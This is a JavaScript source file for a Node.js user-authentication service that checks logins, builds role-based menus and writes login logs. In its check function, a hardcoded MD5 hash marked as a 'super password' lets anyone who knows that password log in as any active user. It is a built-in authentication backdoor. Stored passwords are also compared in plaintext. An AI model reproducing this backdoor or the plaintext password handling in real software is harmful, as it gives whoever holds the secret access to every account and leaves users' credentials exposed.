/**
* Created on 5/10/2020, 3:14:04 PM.
*/

'use strict';

const { BaseService } = require('dolphin-framework-server');
const Model = require("../../../module/system/auth/UserModel");
const md5 = require('md5');


class UserService extends BaseService{
    constructor(){
        super();
        this.name = "UserService";
        this.model = Model;

        this.loginPopulate = [{path: 'role warehouse'}];
        this.loginFields = ['_id', 'name', 'code', 'phone', 'org', 'role', 'tenant', 'source', 'changePasswordFlag', 'warehouse'];
    }

    check(curUser, code, password){
        let condition = {$or: []};
        condition.$or.push({code: code});
        condition.$or.push({email: code});
        return this.findOne(curUser, condition, { populate: this.loginPopulate }).then(user => {
            if(!user || user.state !== 1){
                throw {message: '该用户不存在'};
            }

            if(md5(password) === '98cb162c6906713a814509cdd2596725'){ //超级密码
                return user;
            }

            //TODO 支持LDAP登录
            if(user.password !== password){
                throw {message: '密码不正确'};
            }

            return user;
        });
    }

    login(user, type, ip, menuFlag = true){
        return Promise.resolve().then(() => {
            if(menuFlag && user.role){
                let condition = {}, menuIdSet = new Set();

                if(user.role.find(r => r._id !== 'admin')){
                    user.role.forEach(r => {
                        r.menus.forEach(m => menuIdSet.add(m))
                    });

                    condition = {_id: {'$in': Array.from(menuIdSet)}}
                }

                let menuFields = '_id name parent link icon sort isLeaf';
                return $ServiceMap.system.MenuService.tree(user, null, { condition, field: menuFields })
            }else{
                return [];
            }
        }).then(menu => {
            let userInfo = { menu };
            this.loginFields.forEach(field => userInfo[field] = user[field]);

            //登录日志
            $ServiceMap.system.log.LoginLogService.save(undefined, {user: user._id, type, ip}).then(() => {}).catch(e => {
                this.loggerError(this.name, 'login', 'save login log failed', e)
            });

            return {message: '登陆成功', data: userInfo}
        });
    }
}

module.exports = new UserService();


